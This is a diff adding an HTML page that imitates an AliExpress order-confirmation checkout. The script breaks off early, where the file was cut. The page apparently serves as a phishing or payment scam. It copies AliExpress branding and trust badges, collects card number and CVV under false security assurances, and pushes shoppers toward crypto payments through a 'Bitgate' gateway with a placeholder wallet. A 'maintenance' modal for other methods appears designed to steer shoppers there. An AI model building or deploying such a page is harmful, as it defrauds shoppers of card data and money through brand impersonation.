@@ -1,0 +1,955 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AliExpress - Order Confirmation</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f5f5f5;
+        }
+        .aliexpress-red {
+            color: #FF4747;
+        }
+        .aliexpress-bg-red {
+            background-color: #FF4747;
+        }
+        .summary-card {
+            position: sticky;
+            top: 20px;
+        }
+        /* Modal Styles */
+        #paymentModalOverlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 100;
+            align-items: center;
+            justify-content: center;
+        }
+        #paymentModalOverlay.active,
+        #cardModalOverlay.active,
+        #maintenanceModalOverlay.active {
+            display: flex;
+        }
+        .modal-content {
+            background-color: white;
+            border-radius: 1rem;
+            width: 100%;
+            max-width: 500px;
+            padding: 1.5rem;
+            position: relative;
+        }
+        /* Card Modal Specifics */
+        #cardModalOverlay,
+        #maintenanceModalOverlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 130;
+            align-items: center;
+            justify-content: center;
+        }
+        .input-field {
+            border: 1px solid #e5e5e5;
+            border-radius: 0.5rem;
+            padding: 0.75rem 1rem;
+            width: 100%;
+            font-size: 0.875rem;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        .input-field:focus {
+            border-color: #FF4747;
+        }
+        /* Crypto Payment Specifics */
+        #cryptoModalOverlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 120;
+            align-items: center;
+            justify-content: center;
+        }
+        #cryptoModalOverlay.active {
+            display: flex;
+        }
+        .crypto-address-box {
+            background: #f9f9f9;
+            border: 1px dashed #ddd;
+            word-break: break-all;
+        }
+        .copy-success-toast {
+            display: none;
+            position: absolute;
+            top: -40px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #333;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 4px;
+            font-size: 10px;
+        }
+        .copy-success-toast.active {
+            display: block;
+        }
+        .select-field {
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke='%23999' %3E%3Cpath stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M19 9l-7 7-7-7'%3E%3C/path%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 0.75rem center;
+            background-size: 1rem;
+        }
+        .custom-radio {
+            width: 24px;
+            height: 24px;
+            border: 2px solid #e5e5e5;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s;
+            flex-shrink: 0;
+        }
+        input[type="radio"]:checked + .custom-radio {
+            border-color: #FF4747;
+        }
+        input[type="radio"]:checked + .custom-radio::after {
+            content: "";
+            width: 12px;
+            height: 12px;
+            background-color: #FF4747;
+            border-radius: 50%;
+        }
+        #modalConfirmBtnContainer {
+            display: none;
+            margin-top: 2rem;
+            border-top: 1px solid #f0f0f0;
+            padding-top: 2rem;
+            justify-content: center;
+        }
+        #modalConfirmBtnContainer.active {
+            display: flex;
+        }
+    </style>
+</head>
+<body class="text-gray-800">
+    <!-- Header -->
+    <header class="bg-white border-b py-4">
+        <div class="container mx-auto px-4 flex justify-between items-center">
+            <a href="index.html" class="inline-block">
+                <h1 class="text-2xl font-bold italic tracking-tighter aliexpress-red">AliExpress</h1>
+            </a>
+            <div class="flex items-center gap-2 cursor-pointer" id="locationSelector">
+                <img id="currentFlag" src="https://flagcdn.com/w20/us.png" alt="US" class="w-5 h-3 object-cover">
+            </div>
+        </div>
+    </header>
+
+    <main class="container mx-auto px-4 py-8">
+        <div class="flex flex-col lg:flex-row gap-6">
+            <!-- Left Column: Checkout Details -->
+            <div class="flex-grow space-y-4">
+                <!-- Shipping Address -->
+                <div class="bg-white rounded-xl p-6 shadow-sm">
+                    <h2 class="text-lg font-bold mb-4">Shipping address</h2>
+                    <button class="text-blue-600 text-sm font-medium hover:underline flex items-center gap-1">
+                        <i class="fas fa-plus text-xs"></i> Add new address
+                    </button>
+                </div>
+
+                <!-- Order Item -->
+                <div class="bg-white rounded-xl p-6 shadow-sm">
+                    <div class="flex justify-between items-center mb-6">
+                        <h3 class="font-bold text-sm">Order confirmation</h3>
+                        <p class="text-[10px] text-red-600 flex items-center gap-1"><i class="fas fa-shield-alt"></i> Refund if package lost <i class="fas fa-chevron-right text-[8px]"></i></p>
+                    </div>
+                    <div class="flex gap-4">
+                        <img src="https://ae01.alicdn.com/kf/S8f9037f0048e4b779e56475f6e804a604.jpg_220x220.jpg" class="w-20 h-20 object-cover rounded-lg">
+                        <div class="flex-grow">
+                            <div class="flex items-baseline gap-1 mb-2">
+                                <span class="font-bold">$ 2.55</span>
+                                <span class="text-xs text-gray-300 line-through">$ 5.65</span>
+                            </div>
+                            <div class="flex items-center border rounded w-fit">
+                                <button class="px-2 py-0.5 text-gray-400 border-r">-</button>
+                                <span class="px-4 py-0.5 text-xs">1</span>
+                                <button class="px-2 py-0.5 text-gray-400 border-l">+</button>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="mt-6 pt-6 border-t flex flex-col gap-1">
+                        <p class="text-xs font-bold">Shipping: $ 1.99</p>
+                        <p class="text-xs text-gray-500">Delivery: May 20 - 23</p>
+                    </div>
+                </div>
+
+                <!-- Payment Methods -->
+                <div class="bg-white rounded-xl p-6 shadow-sm">
+                    <div class="flex justify-between items-center mb-6">
+                        <h2 class="text-lg font-bold">Payment Method</h2>
+                        <button class="text-xs text-gray-500 flex items-center gap-1">View more <i class="fas fa-chevron-right text-[8px]"></i></button>
+                    </div>
+                    <div class="space-y-6">
+                        <label class="flex items-start gap-4 cursor-pointer group">
+                            <input type="radio" name="payment" class="w-5 h-5 accent-black mt-1">
+                            <div class="flex flex-col gap-1">
+                                <div class="flex items-center gap-2">
+                                    <div class="border p-1 rounded">
+                                        <i class="fab fa-paypal text-blue-600"></i>
+                                    </div>
+                                    <span class="text-sm font-bold">PayPal</span>
+                                </div>
+                                <p class="text-[10px] text-gray-400 flex items-center gap-1">
+                                    <i class="fas fa-info-circle text-[8px]"></i> Pay easily, quickly, and securely with PayPal.
+                                </p>
+                            </div>
+                        </label>
+                        <label class="flex items-start gap-4 cursor-pointer group">
+                            <input type="radio" name="payment" id="pageCardRadio" class="w-5 h-5 accent-black mt-1">
+                            <div class="flex flex-col gap-2">
+                                <div class="flex items-center gap-2">
+                                    <div class="border p-1 rounded">
+                                        <i class="far fa-credit-card"></i>
+                                    </div>
+                                    <span class="text-sm font-bold">Add a new card</span>
+                                </div>
+                                <div class="flex gap-1">
+                                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" class="h-3">
+                                    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" class="h-3">
+                                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" class="h-3 opacity-0"> <!-- Placeholder for Verve -->
+                                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" class="h-3 opacity-0"> <!-- Placeholder for Amex -->
+                                </div>
+                            </div>
+                        </label>
+                        <label class="flex items-center gap-4 cursor-pointer group">
+                            <input type="radio" name="payment" class="w-5 h-5 accent-black">
+                            <div class="flex items-center gap-2">
+                                <div class="bg-[#a5f3d0] px-1.5 py-0.5 rounded text-[8px] font-bold italic">clearpay</div>
+                                <span class="text-sm font-bold">Clearpay</span>
+                            </div>
+                        </label>
+                        <label class="flex items-center gap-4 cursor-pointer group">
+                            <input type="radio" name="payment" class="w-5 h-5 accent-black">
+                            <div class="flex items-center gap-2">
+                                <div class="border px-1.5 py-0.5 rounded flex items-center gap-1">
+                                    <img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Google_Pay_Logo.svg" class="h-2">
+                                </div>
+                                <span class="text-sm font-bold">Google Pay</span>
+                            </div>
+                        </label>
+                        
+                        <!-- Page-level Crypto Options -->
+                        <div class="pt-4 mt-2 border-t border-gray-100 space-y-6">
+                            <h3 class="text-xs font-bold text-gray-400 uppercase tracking-wider">Cryptocurrency Wallets</h3>
+                            <label class="flex items-center gap-4 cursor-pointer group">
+                                <input type="radio" name="payment" class="w-5 h-5 accent-black page-crypto-radio" value="usdt-trc20">
+                                <div class="flex items-center gap-2">
+                                    <div class="border p-1 rounded">
+                                        <img src="https://cryptologos.cc/logos/tether-usdt-logo.svg?v=032" class="w-4 h-4">
+                                    </div>
+                                    <span class="text-sm font-bold">USDT (TRC20)</span>
+                                </div>
+                            </label>
+                            <label class="flex items-center gap-4 cursor-pointer group">
+                                <input type="radio" name="payment" class="w-5 h-5 accent-black page-crypto-radio" value="usdt-bep20">
+                                <div class="flex items-center gap-2">
+                                    <div class="border p-1 rounded">
+                                        <img src="https://cryptologos.cc/logos/tether-usdt-logo.svg?v=032" class="w-4 h-4">
+                                    </div>
+                                    <span class="text-sm font-bold">USDT (BEP20)</span>
+                                </div>
+                            </label>
+                            <label class="flex items-center gap-4 cursor-pointer group">
+                                <input type="radio" name="payment" class="w-5 h-5 accent-black page-crypto-radio" value="usdt-erc20">
+                                <div class="flex items-center gap-2">
+                                    <div class="border p-1 rounded">
+                                        <img src="https://cryptologos.cc/logos/tether-usdt-logo.svg?v=032" class="w-4 h-4">
+                                    </div>
+                                    <span class="text-sm font-bold">USDT (ERC20)</span>
+                                </div>
+                            </label>
+                            <label class="flex items-center gap-4 cursor-pointer group">
+                                <input type="radio" name="payment" class="w-5 h-5 accent-black page-crypto-radio" value="btc">
+                                <div class="flex items-center gap-2">
+                                    <div class="border p-1 rounded">
+                                        <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.svg?v=032" class="w-4 h-4">
+                                    </div>
+                                    <span class="text-sm font-bold">BTC</span>
+                                </div>
+                            </label>
+                            <label class="flex items-center gap-4 cursor-pointer group">
+                                <input type="radio" name="payment" class="w-5 h-5 accent-black page-crypto-radio" value="eth">
+                                <div class="flex items-center gap-2">
+                                    <div class="border p-1 rounded">
+                                        <img src="https://cryptologos.cc/logos/ethereum-eth-logo.svg?v=032" class="w-4 h-4">
+                                    </div>
+                                    <span class="text-sm font-bold">ETH</span>
+                                </div>
+                            </label>
+                            <label class="flex items-center gap-4 cursor-pointer group">
+                                <input type="radio" name="payment" class="w-5 h-5 accent-black page-crypto-radio" value="usdc">
+                                <div class="flex items-center gap-2">
+                                    <div class="border p-1 rounded">
+                                        <img src="https://cryptologos.cc/logos/usd-coin-usdc-logo.svg?v=032" class="w-4 h-4">
+                                    </div>
+                                    <span class="text-sm font-bold">USDC</span>
+                                </div>
+                            </label>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Promo code -->
+                <div class="bg-white rounded-xl p-6 shadow-sm flex justify-between items-center cursor-pointer">
+                    <span class="text-sm font-bold">Promo code</span>
+                    <i class="fas fa-chevron-right text-xs text-gray-300"></i>
+                </div>
+            </div>
+
+            <!-- Right Column: Summary -->
+            <div class="w-full lg:w-96">
+                <div class="bg-white rounded-xl p-6 shadow-sm summary-card">
+                    <h2 class="text-xl font-bold mb-6">Summary</h2>
+                    <div class="space-y-4 text-sm mb-6">
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">Subtotal</span>
+                            <span class="font-medium">$ 2.55 <i class="fas fa-chevron-up text-[8px] text-gray-400"></i></span>
+                        </div>
+                    </div>
+                    <div class="border-t pt-4 mb-6">
+                        <div class="flex justify-between items-baseline">
+                            <div class="flex flex-col">
+                                <div class="flex items-baseline gap-1">
+                                    <span class="text-lg font-bold">Total:</span>
+                                    <span class="text-2xl font-bold">$ 4.54</span>
+                                </div>
+                                <span class="text-[10px] text-gray-400 flex items-center gap-1">VAT included <i class="far fa-question-circle text-[8px]"></i></span>
+                            </div>
+                            <button id="placeOrderBtn" class="bg-[#FF4747] text-white font-bold py-3 px-8 rounded-full text-base hover:opacity-90 transition-opacity">
+                                Place order
+                            </button>
+                        </div>
+                    </div>
+                    <p class="text-[10px] text-gray-400 leading-tight">
+                        Upon clicking 'Place Order', I confirm I have read and acknowledged <a href="#" class="text-blue-500 hover:underline">all terms and policies</a>.
+                    </p>
+
+                    <div class="mt-8 pt-8 border-t">
+                        <div class="flex items-center gap-2 mb-2">
+                            <i class="far fa-shield-alt text-lg text-red-500"></i>
+                            <span class="text-xs font-bold">AliExpress</span>
+                        </div>
+                        <p class="text-[11px] text-gray-500 mb-4">AliExpress keeps your information and payment safe</p>
+                        <div class="flex gap-2">
+                            <img src="https://ae01.alicdn.com/kf/S7f0c184c8f584e038084a44f45447a16E.jpg_100x100.jpg" class="h-6 opacity-50 grayscale"> <!-- Placeholder for trust icons -->
+                            <img src="https://ae01.alicdn.com/kf/S2c89f7f4585c4909a39f5062a45447a16E.jpg_100x100.jpg" class="h-6 opacity-50 grayscale">
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-[#f2f2f2] pt-12 border-t mt-12">
+        <div class="container mx-auto px-4">
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-2 gap-12 mb-12">
+                <div class="space-y-8">
+                    <div>
+                        <h4 class="font-bold text-sm mb-4">Help</h4>
+                        <p class="text-[10px] text-gray-500 leading-relaxed max-w-md">
+                            Help Center, Disputes & Reports, Return & refund policy, Report IPR infringement, DSA/OSA information, Integrity Compliance, Transparency Center, Submit report (non-registered users), Return Policy
+                        </p>
+                    </div>
+                    <div>
+                        <h4 class="font-bold text-sm mb-4">Browse by Category</h4>
+                        <p class="text-[10px] text-gray-500 leading-relaxed max-w-md">
+                            All Popular, Product, Promotion, Low Price, Great Value, Reviews, Wiki, Blog, Video
+                        </p>
+                    </div>
+                </div>
+                <div class="space-y-8">
+                    <div>
+                        <h4 class="font-bold text-sm mb-4">AliExpress Multi-Language Sites</h4>
+                        <p class="text-[10px] text-gray-500 leading-relaxed max-w-md">
+                            Russian, Portuguese, Spanish, French, German, Italian, Dutch, Turkish, Japanese, Korean, Thai, Arabic, Hebrew, Polish
+                        </p>
+                    </div>
+                    <div>
+                        <h4 class="font-bold text-sm mb-4">Alibaba Group</h4>
+                        <p class="text-[10px] text-gray-500 leading-relaxed max-w-md">
+                            Alibaba Group Website, AliExpress, Alimama, Alipay, Fliggy, Alibaba Cloud, Alibaba International, AliTelecom, DingTalk, Juhuasuan, Taobao Marketplace, Tmall, Taobao Global, AliOS, 1688
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="bg-[#333333] text-white py-6">
+            <div class="container mx-auto px-4 text-[10px] flex flex-wrap justify-between items-center gap-4">
+                <div class="flex flex-wrap gap-4 text-gray-300">
+                    <a href="#" class="hover:underline">Intellectual Property Protection</a>
+                    <a href="#" class="hover:underline">Privacy Policy</a>
+                    <a href="#" class="hover:underline">Sitemap</a>
+                    <a href="#" class="hover:underline">Terms of Use</a>
+                    <a href="#" class="hover:underline">Information for EU consumers</a>
+                    <a href="#" class="hover:underline font-bold text-white">Legal Information / Imprint</a>
+                </div>
+                <div class="text-gray-400">
+                    © 2010-2025 AliExpress.com. All rights reserved.
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Payment Modal Overlay -->
+    <div id="paymentModalOverlay">
+        <div class="modal-content shadow-2xl">
+            <button id="closeModalBtn" class="absolute top-4 right-4 text-gray-400 hover:text-black transition-colors">
+                <i class="fas fa-times text-xl"></i>
+            </button>
+            
+            <div class="text-center mb-6">
+                <h2 class="text-lg font-bold">Payment Methods</h2>
+                <p class="text-[10px] text-green-500 flex items-center justify-center gap-1 mt-1">
+                    <i class="far fa-check-circle"></i> Your payment information is safe with us
+                </p>
+            </div>
+
+            <div class="space-y-6">
+                 <!-- Option 1: PayPal -->
+                 <label class="flex items-center gap-4 cursor-pointer group">
+                     <input type="radio" name="modal-payment" class="hidden" value="paypal">
+                     <div class="custom-radio"></div>
+                     <div class="flex items-center gap-3">
+                         <i class="fab fa-paypal text-blue-600 text-lg"></i>
+                         <span class="text-sm font-bold">PayPal</span>
+                     </div>
+                 </label>
+
+                 <!-- Option 2: Add card -->
+                 <label class="flex items-center gap-4 cursor-pointer group">
+                     <input type="radio" name="modal-payment" class="hidden" value="card">
+                     <div class="custom-radio"></div>
+                     <div class="flex-grow">
+                         <div class="flex items-center gap-3 mb-1">
+                             <i class="far fa-credit-card text-lg"></i>
+                             <span class="text-sm font-bold">Add a new card</span>
+                         </div>
+                         <div class="flex gap-2">
+                             <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" class="h-3">
+                             <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" class="h-3">
+                             <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" class="h-3">
+                         </div>
+                     </div>
+                 </label>
+
+                 <!-- Option 3: Clearpay -->
+                 <label class="flex items-center gap-4 cursor-pointer group">
+                     <input type="radio" name="modal-payment" class="hidden" value="clearpay">
+                     <div class="custom-radio"></div>
+                     <div class="flex items-center gap-3">
+                         <div class="bg-[#a5f3d0] px-1.5 py-0.5 rounded text-[10px] font-bold italic">clearpay</div>
+                         <span class="text-sm font-bold">Clearpay</span>
+                     </div>
+                 </label>
+
+                 <!-- Option 4: Google Pay -->
+                  <label class="flex items-center gap-4 cursor-pointer group">
+                      <input type="radio" name="modal-payment" class="hidden" value="googlepay">
+                      <div class="custom-radio"></div>
+                      <div class="flex items-center gap-3">
+                          <img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Google_Pay_Logo.svg" class="h-3">
+                          <span class="text-sm font-bold">Google Pay</span>
+                      </div>
+                  </label>
+
+                  <!-- Cryptocurrency Section -->
+                  <div class="pt-4 mt-2 border-t border-gray-100">
+                      <h3 class="text-xs font-bold text-gray-400 uppercase tracking-wider mb-4">Cryptocurrency Wallets</h3>
+                      <div class="grid grid-cols-2 gap-4">
+                          <!-- USDT TRC20 -->
+                          <label class="flex items-center gap-3 p-3 border rounded-lg cursor-pointer hover:border-black transition-colors group">
+                              <input type="radio" name="modal-payment" class="hidden" value="usdt-trc20">
+                              <div class="custom-radio"></div>
+                              <div class="flex items-center gap-2">
+                                  <img src="https://cryptologos.cc/logos/tether-usdt-logo.svg?v=032" class="w-4 h-4">
+                                  <span class="text-[10px] font-bold">USDT (TRC20)</span>
+                              </div>
+                          </label>
+                          <!-- USDT BEP20 -->
+                          <label class="flex items-center gap-3 p-3 border rounded-lg cursor-pointer hover:border-black transition-colors group">
+                              <input type="radio" name="modal-payment" class="hidden" value="usdt-bep20">
+                              <div class="custom-radio"></div>
+                              <div class="flex items-center gap-2">
+                                  <img src="https://cryptologos.cc/logos/tether-usdt-logo.svg?v=032" class="w-4 h-4">
+                                  <span class="text-[10px] font-bold">USDT (BEP20)</span>
+                              </div>
+                          </label>
+                          <!-- USDT ERC20 -->
+                          <label class="flex items-center gap-3 p-3 border rounded-lg cursor-pointer hover:border-black transition-colors group">
+                              <input type="radio" name="modal-payment" class="hidden" value="usdt-erc20">
+                              <div class="custom-radio"></div>
+                              <div class="flex items-center gap-2">
+                                  <img src="https://cryptologos.cc/logos/tether-usdt-logo.svg?v=032" class="w-4 h-4">
+                                  <span class="text-[10px] font-bold">USDT (ERC20)</span>
+                              </div>
+                          </label>
+                          <!-- BTC -->
+                          <label class="flex items-center gap-3 p-3 border rounded-lg cursor-pointer hover:border-black transition-colors group">
+                              <input type="radio" name="modal-payment" class="hidden" value="btc">
+                              <div class="custom-radio"></div>
+                              <div class="flex items-center gap-2">
+                                  <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.svg?v=032" class="w-4 h-4">
+                                  <span class="text-xs font-bold">BTC</span>
+                              </div>
+                          </label>
+                          <!-- ETH -->
+                          <label class="flex items-center gap-3 p-3 border rounded-lg cursor-pointer hover:border-black transition-colors group">
+                              <input type="radio" name="modal-payment" class="hidden" value="eth">
+                              <div class="custom-radio"></div>
+                              <div class="flex items-center gap-2">
+                                  <img src="https://cryptologos.cc/logos/ethereum-eth-logo.svg?v=032" class="w-4 h-4">
+                                  <span class="text-xs font-bold">ETH</span>
+                              </div>
+                          </label>
+                          <!-- USDC -->
+                          <label class="flex items-center gap-3 p-3 border rounded-lg cursor-pointer hover:border-black transition-colors group">
+                              <input type="radio" name="modal-payment" class="hidden" value="usdc">
+                              <div class="custom-radio"></div>
+                              <div class="flex items-center gap-2">
+                                  <img src="https://cryptologos.cc/logos/usd-coin-usdc-logo.svg?v=032" class="w-4 h-4">
+                                  <span class="text-sm font-bold">USDC</span>
+                              </div>
+                          </label>
+                      </div>
+                  </div>
+              </div>
+
+            <!-- Confirm Button Container -->
+             <div id="modalConfirmBtnContainer">
+                 <button id="modalConfirmBtn" class="w-full max-w-lg aliexpress-bg-red text-white font-bold py-4 rounded-full text-lg hover:opacity-90 transition-opacity">
+                     Confirm
+                 </button>
+             </div>
+         </div>
+     </div>
+
+     <!-- Card Information Modal Overlay -->
+     <div id="cardModalOverlay">
+         <div class="modal-content shadow-2xl">
+             <button id="closeCardModalBtn" class="absolute top-4 right-4 text-gray-400 hover:text-black transition-colors">
+                 <i class="fas fa-times text-xl"></i>
+             </button>
+
+             <div class="text-center mb-6">
+                 <h2 class="text-lg font-bold">Provide further information</h2>
+                 <p class="text-[10px] text-green-500 flex items-center justify-center gap-1 mt-1">
+                     <i class="far fa-check-circle"></i> Your payment information is safe with us
+                 </p>
+             </div>
+
+             <div class="bg-red-50/50 p-4 rounded-lg flex items-center justify-between mb-6">
+                 <div class="flex items-center gap-3">
+                     <i class="far fa-credit-card text-gray-600"></i>
+                     <span class="text-sm font-bold">Add a new card</span>
+                     <div class="flex gap-1 ml-2">
+                         <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" class="h-3">
+                         <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" class="h-3">
+                         <img src="https://ae01.alicdn.com/kf/S9387a956163342378a5994f981e494d93.jpg_100x100.jpg" class="h-3 opacity-0"> <!-- Verve placeholder -->
+                         <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" class="h-3">
+                     </div>
+                 </div>
+                 <button class="text-blue-500 text-xs font-medium">Full List <i class="fas fa-chevron-right text-[8px]"></i></button>
+             </div>
+
+             <div class="grid grid-cols-2 gap-4 mb-4">
+                 <input type="text" placeholder="Card number" class="input-field">
+                 <input type="text" placeholder="Cardholder name" class="input-field">
+             </div>
+
+             <div class="grid grid-cols-2 gap-4 mb-6">
+                 <div class="flex items-center gap-2">
+                     <select class="input-field select-field">
+                         <option>MM</option>
+                     </select>
+                     <span class="text-gray-400">/</span>
+                     <select class="input-field select-field">
+                         <option>YY</option>
+                     </select>
+                 </div>
+                 <div class="relative">
+                     <input type="text" placeholder="CVV" class="input-field">
+                     <i class="far fa-question-circle absolute right-3 top-1/2 -translate-y-1/2 text-gray-400"></i>
+                 </div>
+             </div>
+
+             <div class="flex items-center gap-2 mb-8">
+                 <div class="w-5 h-5 bg-red-500 rounded-full flex items-center justify-center text-white text-[10px]">
+                     <i class="fas fa-check"></i>
+                 </div>
+                 <span class="text-xs font-medium">Save card details</span>
+             </div>
+
+             <div class="space-y-3 mb-8">
+                 <div class="flex items-center gap-2 text-sm font-bold">
+                     <i class="far fa-shield-check text-lg"></i>
+                     <span>AliExpress protects your payment information</span>
+                 </div>
+                 <ul class="text-[11px] text-gray-600 space-y-2">
+                     <li class="flex items-center gap-2"><i class="fas fa-check text-green-500 text-[8px]"></i> We follow the Payment Card Industry Data Security Standard (PCI DSS) when handling card data</li>
+                     <li class="flex items-center gap-2"><i class="fas fa-check text-green-500 text-[8px]"></i> All information remains secure and uncompromised</li>
+                     <li class="flex items-center gap-2"><i class="fas fa-check text-green-500 text-[8px]"></i> All data is encrypted</li>
+                     <li class="flex items-center gap-2"><i class="fas fa-check text-green-500 text-[8px]"></i> Your card information will never be mishandled or sold</li>
+                 </ul>
+             </div>
+
+             <div class="flex gap-4 mb-8">
+                 <img src="https://ae01.alicdn.com/kf/S7f0c184c8f584e038084a44f45447a16E.jpg_100x100.jpg" class="h-6 grayscale opacity-50">
+                 <img src="https://ae01.alicdn.com/kf/S2c89f7f4585c4909a39f5062a45447a16E.jpg_100x100.jpg" class="h-6 grayscale opacity-50">
+             </div>
+
+             <div class="flex justify-center border-t pt-8">
+                  <button class="w-full max-w-xl aliexpress-bg-red text-white font-bold py-4 rounded-full text-lg hover:opacity-90 transition-opacity">
+                      Save & confirm
+                  </button>
+              </div>
+          </div>
+      </div>
+
+      <!-- Crypto Payment Modal Overlay -->
+      <div id="cryptoModalOverlay">
+          <div class="modal-content shadow-2xl">
+              <button id="closeCryptoModalBtn" class="absolute top-4 right-4 text-gray-400 hover:text-black transition-colors">
+                  <i class="fas fa-times text-xl"></i>
+              </button>
+
+              <div class="text-center mb-8">
+                  <div class="flex items-center justify-center gap-2 mb-2">
+                      <i class="fas fa-link text-red-500 text-xs"></i>
+                      <span class="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Bitgate Payment Gateway</span>
+                  </div>
+                  <h2 class="text-xl font-bold mb-2">Send <span id="cryptoName">USDT</span> Payment</h2>
+                  <p class="text-xs text-gray-500">Secure blockchain transaction powered by Bitgate</p>
+              </div>
+
+              <div class="flex justify-center mb-8">
+                  <div class="p-4 border-2 border-gray-100 rounded-2xl bg-white shadow-inner">
+                      <img id="cryptoQR" src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=PlaceholderAddress" class="w-48 h-48">
+                  </div>
+              </div>
+
+              <div class="space-y-6">
+                  <div>
+                      <label class="text-xs font-bold text-gray-400 uppercase mb-2 block">Payment Amount</label>
+                      <div class="flex items-center justify-between p-4 bg-gray-50 rounded-xl border">
+                          <span class="text-lg font-bold text-black" id="cryptoAmountDisplay">£ 4.54</span>
+                          <span class="text-xs font-medium text-gray-400" id="cryptoSymbolDisplay">USDT</span>
+                      </div>
+                  </div>
+
+                  <div class="relative">
+                      <label class="text-xs font-bold text-gray-400 uppercase mb-2 block">Wallet Address</label>
+                      <div class="crypto-address-box p-4 rounded-xl flex items-center justify-between gap-4">
+                          <span id="cryptoAddress" class="text-xs font-mono text-gray-600 truncate">0xPlaceholderAddress1234567890abcdef</span>
+                          <button id="copyAddressBtn" class="flex-shrink-0 text-red-500 hover:text-red-600 transition-colors p-2">
+                              <i class="far fa-copy text-lg"></i>
+                          </button>
+                          <div id="copyToast" class="copy-success-toast">Copied!</div>
+                      </div>
+                  </div>
+
+                  <div class="bg-blue-50 p-4 rounded-xl border border-blue-100 flex items-start gap-3">
+                      <i class="fas fa-info-circle text-blue-500 mt-0.5"></i>
+                      <p class="text-[10px] text-blue-700 leading-relaxed">
+                          Please ensure you are sending <span class="font-bold" id="cryptoWarningSymbol">USDT</span> over the correct network. Incorrect network may result in loss of funds.
+                      </p>
+                  </div>
+
+                  <div class="pt-4">
+                      <button id="paidBtn" class="w-full bg-[#FF4747] text-white font-bold py-4 rounded-full text-lg hover:opacity-90 transition-all flex items-center justify-center gap-2">
+                          <i class="fas fa-shield-alt"></i> Proceed via Bitgate Secure
+                      </button>
+                      <div class="flex items-center justify-center gap-4 mt-6">
+                          <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Bitcoin.svg" class="h-4 grayscale opacity-30">
+                          <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Tether_Logo.svg" class="h-4 grayscale opacity-30">
+                          <img src="https://upload.wikimedia.org/wikipedia/commons/e/eb/Ethereum_Classic_Logo.svg" class="h-4 grayscale opacity-30">
+                      </div>
+                      <p class="text-center text-[10px] text-gray-400 mt-4">
+                          Transactions are monitored and secured by Bitgate Protection
+                      </p>
+                  </div>
+              </div>
+          </div>
+      </div>
+
+      <!-- Maintenance Modal Overlay -->
+      <div id="maintenanceModalOverlay">
+          <div class="modal-content shadow-2xl text-center py-12">
+              <button id="closeMaintenanceModalBtn" class="absolute top-4 right-4 text-gray-400 hover:text-black transition-colors">
+                  <i class="fas fa-times text-xl"></i>
+              </button>
+              <div class="mb-6">
+                  <div class="w-20 h-20 bg-orange-100 text-orange-500 rounded-full flex items-center justify-center mx-auto mb-4">
+                      <i class="fas fa-tools text-3xl"></i>
+                  </div>
+                  <h2 class="text-2xl font-bold text-gray-800">Under Maintenance</h2>
+                  <p class="text-gray-500 mt-2">This payment method is currently undergoing scheduled maintenance. Please try another method or check back later.</p>
+              </div>
+              <button onclick="closeMaintenanceModal()" class="w-full bg-black text-white font-bold py-3 rounded-full hover:bg-gray-800 transition-colors">
+                  Got it
+              </button>
+          </div>
+      </div>
+
+    <script>
+        function updateLocation(flagCode, currency, countryName) {
+            localStorage.setItem('selectedLocation', JSON.stringify({ flagCode, currency, countryName }));
+            applyLocation();
+        }
+
+        function applyLocation() {
+            const location = JSON.parse(localStorage.getItem('selectedLocation')) || { flagCode: 'us', currency: 'USD', countryName: 'United States' };
+            
+            // Update Header if exists (confirm page has simplified header)
+            const currentFlag = document.getElementById('currentFlag');
+            if (currentFlag) currentFlag.src = `https://flagcdn.com/w20/${location.flagCode}.png`;
+        }
+
+        // Initialize on load
+        document.addEventListener('DOMContentLoaded', applyLocation);
+
+        const placeOrderBtn = document.getElementById('placeOrderBtn');
